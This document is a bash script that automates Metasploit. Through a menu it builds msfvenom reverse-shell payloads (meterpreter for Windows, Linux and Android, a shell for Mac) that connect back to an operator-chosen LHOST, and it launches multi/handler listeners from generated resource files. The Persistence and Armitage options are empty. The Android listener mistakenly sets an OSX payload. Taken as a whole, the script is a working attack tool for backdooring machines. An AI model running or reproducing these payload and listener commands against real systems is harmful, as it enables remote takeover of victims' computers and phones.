#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m:::::: \e[97mScripts and payloads saved to ~/Desktop/temp/ \E[1;33m::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automation script \E[1;33m:::::::::::::::"
echo -e ""
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::\e[97m[1] \e[90mPayload       \e[97m [Create a payload with msvenom]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mListen    \e[97m [Start a multi handler]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[3] \e[34mExploit       \e[97m [Drop into msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence        \e[97m ] \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[5] \e[31mArmitage       \e[97m []  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[X] \e[32m \e[97m ]   \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mGreetz to the 2600 \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
            ;;  
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Linux")
            touch ~/Desktop/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_linux.rc
            cat ~/Desktop/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/Desktop/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/Desktop/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/Desktop/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_droid.rc
            cat ~/Desktop/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;


          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0